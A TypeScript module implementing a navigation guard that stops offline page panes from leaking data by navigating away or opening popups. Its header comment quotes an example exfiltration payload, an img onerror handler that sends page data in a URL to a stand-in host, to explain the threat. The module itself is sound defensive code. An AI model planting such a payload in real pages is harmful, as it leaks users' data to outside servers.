/**
 * Navigation egress of an OFFLINE page pane (T569 delta 1, F2). Pure (ADR-0001).
 *
 * The §4.3 policy keeps a `page` pane off the network with a CSP, but a CSP does not stop the page from
 * NAVIGATING away: `<img onerror="location='http://x/?d=…'">` reaches the server with whatever the page put in
 * the URL. A read-only Scheduler worker may patch markup into a panel, so that is an exfiltration channel unless
 * navigation is held to the same rule: while the pane's operator switch is off, a page pane may go only to its
 * own folder host or `about:blank`, and may open no popup.
 *
 * The operator (the address bar) and the verbs navigate with `loadURL`, which never passes through the
 * `will-navigate` guard that calls this, so leaving the panel stays possible for them.
 */

export type EgressVerdict = { allow: true } | { allow: false }

function parse(raw: string): URL | null {
  try {
    return new URL(raw)
  } catch {
    return null
  }
}

/** Whether `url` is a `harnu-page:` address. */
export function isPageUrl(raw: string): boolean {
  return parse(raw)?.protocol === 'harnu-page:'
}

/**
 * May a page pane showing `currentUrl` navigate (top-level or in a frame) to `targetUrl`?
 * Anything not currently a page, and any pane the operator switched network on for, is left to the other layers.
 */
export function decidePageNavigation(opts: {
  currentUrl: string
  targetUrl: string
  allowNetwork: boolean
}): EgressVerdict {
  const current = parse(opts.currentUrl)
  if (current?.protocol !== 'harnu-page:') return { allow: true }
  if (opts.allowNetwork) return { allow: true }
  const target = parse(opts.targetUrl)
  if (!target) return { allow: false }
  if (target.href === 'about:blank') return { allow: true }
  if (target.protocol === 'harnu-page:' && target.host === current.host) return { allow: true }
  return { allow: false }
}

/** A popup from an offline page pane is never opened: its target is the exfiltration channel itself. */
export function popupAllowedFrom(opts: { currentUrl: string; allowNetwork: boolean }): boolean {
  return !isPageUrl(opts.currentUrl) || opts.allowNetwork
}
